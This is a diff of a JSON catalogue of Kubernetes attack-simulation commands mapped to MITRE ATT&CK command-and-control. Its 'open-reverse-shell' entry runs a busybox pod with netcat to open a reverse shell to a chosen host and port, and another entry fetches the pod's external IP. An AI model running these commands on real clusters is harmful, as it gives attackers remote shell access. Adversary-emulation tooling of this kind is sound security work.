@@ -1,24 +1,34 @@
 [
-    {
+  {
     "id": "rk-cnc01",
     "name": "get-external-ip",
     "description": "get current nat external ip",
     "tactic_id": "TA0011",
     "mitre_ref": "https://attack.mitre.org/tactics/TA0011/",
     "mode": "active",
-    "args": "True",
+    "multistep": false,
+    "args": true,
+    "arg_list": [
+      "POD_NAME",
+      "NAMESPACE"
+    ],
     "command": "kubectl exec $POD_NAME -n $NAMESPACE -- curl https://ipinfo.io/json",
     "leading_to": ""
-    },
-    {
+  },
+  {
     "id": "rk-cnc02",
     "name": "open-reverse-shell",
     "description": "creates a busybox container with reverse shell to a dedicated ip and port",
     "tactic_id": "TA0011",
     "mitre_ref": "https://attack.mitre.org/tactics/TA0011/",
     "mode": "active",
-    "args": "True",
-    "command": "kubectl run pod-shell --image=busybox -- nc <HOST> <PORT> -e /bin/sh",
+    "multistep": false,
+    "args": true,
+    "arg_list": [
+      "HOST",
+      "PORT"
+    ],
+    "command": "kubectl run pod-shell --image=busybox -- nc $HOST $PORT -e /bin/sh",
     "leading_to": ""
-    }
+  }
 ]
